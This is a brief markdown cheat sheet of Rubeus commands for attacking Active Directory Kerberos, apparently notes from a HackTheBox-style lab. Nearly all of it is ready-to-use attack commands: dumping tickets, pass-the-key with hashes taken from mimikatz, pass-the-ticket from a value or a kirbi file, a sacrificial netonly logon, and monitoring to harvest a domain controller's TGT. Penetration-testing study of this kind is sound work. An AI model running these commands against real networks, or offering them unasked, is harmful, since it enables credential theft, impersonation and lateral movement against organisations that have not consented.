# Rubeus - AD

## rubeus - export tickets
```
Rubeus.exe dump /nowrap
```

## rubeus - PtK
```
# Using the hash extracted from mimikatz sekurlsa:ekeys
# No need for admin rights
Rubeus.exe  asktgt /domain:<DOMAIN> /user:<USERNAME> /aes256:<KEY/HASH> /nowrap
```

## rubeus - PtT from ticket value
```
# submit the ticket (TGT or TGS) to the current logon session
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<TICKET> /ptt
```

## rubeus - PtT from kirbi file
```
# submit the ticket (TGT or TGS) to the current logon session
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbgt-blah.blah.kirbi

# OR convert the file as b64 and pass it by value
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-blah.blah.kirbi"))
Rubeus.exe ptt /ticket:<TICKETVALUE>
```

## rubeus - Powershell remoting with PtT
```
# Creates a sacrificial login
# equivalent of 'runas /netonly' => no erasure of existing TGT in the current logon session
# Create a new window, use this session from now
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<Ticket> /ptt
```

# Rubeus - Harvest TGT of specific user
```
Rubeus.exe monitor /interval:10 /targetuser:DC01$
```
